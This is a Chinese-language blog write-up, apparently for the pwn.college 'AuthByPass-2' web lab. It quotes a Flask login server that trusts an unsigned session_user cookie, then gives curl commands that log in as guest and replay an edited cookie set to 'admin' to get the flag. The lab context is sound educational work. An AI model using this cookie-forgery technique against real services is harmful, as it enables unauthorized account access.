@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>AuthByPass-2 | 0x4A</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="题目简介&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AuthByPass-2">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/AuthByPass-2/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页">
+<meta property="og:locale">
+<meta property="og:image" content="http://0x4a-210.github.io/%22./photos/Web/AuthByPass-2/cookie.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/AuthByPass-2/flag.png">
+<meta property="article:published_time" content="2025-07-14T14:09:14.000Z">
+<meta property="article:modified_time" content="2025-07-15T01:45:08.055Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://0x4a-210.github.io/%22./photos/Web/AuthByPass-2/cookie.png">
+  
+    <link rel="alternate" href="/atom.xml" title="0x4A" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">0x4A</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://0x4A-210.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-pwn.college-Wp/Intro-to-Cybersecurity/Web/AuthByPass-2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/AuthByPass-2/" class="article-date">
+  <time class="dt-published" datetime="2025-07-14T14:09:14.000Z" itemprop="datePublished">2025-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      AuthByPass-2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；<br><br>GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页</p>
+<span id="more"></span>
+
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>阅读server脚本的源代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_post</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `username` form parameter&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">        flask.abort(<span class="number">400</span>, <span class="string">&quot;Missing `password` form parameter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_select.html</span></span><br><span class="line">    user = db.execute(<span class="string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    response = flask.redirect(flask.request.path)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;session_user&#x27;</span>, username)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (username := flask.request.cookies.get(<span class="string">&quot;session_user&quot;</span>, <span class="literal">None</span>)):</span><br><span class="line">        page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="subst">&#123;username&#125;</span>!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            page += <span class="string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+<p>发现服务端的身份验证是有漏洞的，因为当发起GET请求同时传入的cookie是admin的话，就不会再次校验admin的口令，因此首先以guest身份登录，并保存cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://challenge.localhost:80&quot;</span> -X POST -H <span class="string">&quot;Host:challenge.localhost:80&quot;</span> -c cookies.txt -d <span class="string">&quot;username=guest&amp;password=password&quot;</span></span><br></pre></td></tr></table></figure>
+<p>去当前文件夹下把cookies.txt里的session_user字段改为admin<br><img src="/%22./photos/Web/AuthByPass-2/cookie.png"><br>修改完后向服务端再次发起请求，只不过这次是发送GET请求，并且携带该cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://challenge.localhost:80?&quot;</span> -H <span class="string">&quot;Host:challenge.localhost:80&quot;</span> -b cookies.txt</span><br></pre></td></tr></table></figure>
+<p>最后得到包含flag的响应体<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/flag.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://0x4a-210.github.io/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/AuthByPass-2/" data-id="cmd3vf8py0000dkvfedkm0baz" data-title="AuthByPass-2" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/07/15/pwn.college-Wp/Intro-to-Cybersecurity/Web/XSS-5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          XSS-5
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/CMDi-6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">CMDi-6</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/07/">July 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/07/15/pwn.college-Wp/Intro-to-Cybersecurity/Web/XSS-5/">XSS-5</a>
+          </li>
+        
+          <li>
+            <a href="/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/AuthByPass-2/">AuthByPass-2</a>
+          </li>
+        
+          <li>
+            <a href="/2025/07/14/pwn.college-Wp/Intro-to-Cybersecurity/Web/CMDi-6/">CMDi-6</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 0x4A<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
